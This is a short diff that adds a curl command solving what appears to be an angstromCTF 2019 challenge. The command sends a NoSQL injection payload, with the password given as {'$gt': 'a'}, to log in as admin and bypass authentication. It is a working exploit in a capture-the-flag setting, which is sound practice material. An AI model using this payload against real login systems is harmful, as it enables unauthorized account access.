@@ -1,0 +1,4 @@
+curl -i https://nosequels.2019.chall.actf.co/login \
+-H 'Content-type: application/json' \
+-d '{"username": "admin", "password": {"$gt": "a"}}' \
+-H 'Cookie: token=jwt-token'
